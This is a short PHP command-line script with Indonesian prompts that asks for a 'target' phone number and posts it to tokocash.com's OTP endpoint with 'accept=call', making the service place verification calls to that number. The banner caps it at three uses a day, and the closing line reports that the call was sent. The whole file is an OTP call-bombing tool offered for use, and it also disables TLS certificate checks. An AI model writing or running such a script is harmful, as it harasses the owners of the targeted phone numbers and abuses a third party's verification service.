<?php
echo "\033[32;1mL I M I T  3 X  P E R  H A R I \n";
echo "\033[36;1mPASTIKAN AWALAN NOMERNYA \033[32;1m+62\n";
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        
        $rif = curl_exec($ch);
        curl_close($ch);
      
}
echo "THANKS TO R133F THE SCRIPT MAKER..\n\n";
echo "\033[32;1mNomer Target\033[33;1m : ";
echo $nomor;
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
echo "BERHASIL MENGIRIM CALL\n";
?>
